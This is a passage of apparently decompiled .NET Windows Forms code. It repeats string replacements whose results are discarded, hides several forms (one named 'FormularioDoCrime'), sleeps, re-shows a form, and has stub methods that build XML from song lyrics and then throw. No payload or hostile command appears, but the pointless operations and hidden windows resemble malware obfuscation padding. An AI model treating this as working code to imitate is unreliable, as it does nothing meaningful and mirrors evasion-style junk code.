				Strings.Replace(xelement2.Value, "o", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "p", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "q", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				base.Visible = false;
				base.Hide();
				MyProject.Forms.FormularioDoCrime.Visible = false;
				MyProject.Forms.FormularioDoCrime.Hide();
				MyProject.Forms.FormulaMagicaDaPaz.Visible = false;
				MyProject.Forms.FormulaMagicaDaPaz.Hide();
				Thread.Sleep(2000);
				MyProject.Forms.FormularioDoCrime.Show();
			}
		}

		// Token: 0x06000D4F RID: 3407 RVA: 0x0004274E File Offset: 0x0004094E
		private void Button1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000D50 RID: 3408 RVA: 0x00042750 File Offset: 0x00040950
		public static object intRESULTAAAA()
		{
			new XElement(XName.Get("chapa", "")).Add("\n                         Se os verme tenta invadi\n\n        A chapa vai esquenta\n\n        traz logo \n\n        O meu parafal\n\n        Tracante vermelhoooooooooooooooo\n\n\n                     ");
			throw new NotImplementedException();
		}

		// Token: 0x06000D51 RID: 3409 RVA: 0x00042782 File Offset: 0x00040982
		private void Button2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000D52 RID: 3410 RVA: 0x00042784 File Offset: 0x00040984
		private object intRESULT()
		{
			new XElement(XName.Get("chapa", "")).Add("\n                         Se os verme tenta invadi\n\n        A chapa vai esquenta\n\n        traz logo \n\n        O meu parafal\n\n        Tracante vermelhoooooooooooooooo\n\n\n                     ");
			throw new NotImplementedException();
		}

		// Token: 0x0400068E RID: 1678
		private IContainer components;
	}
}
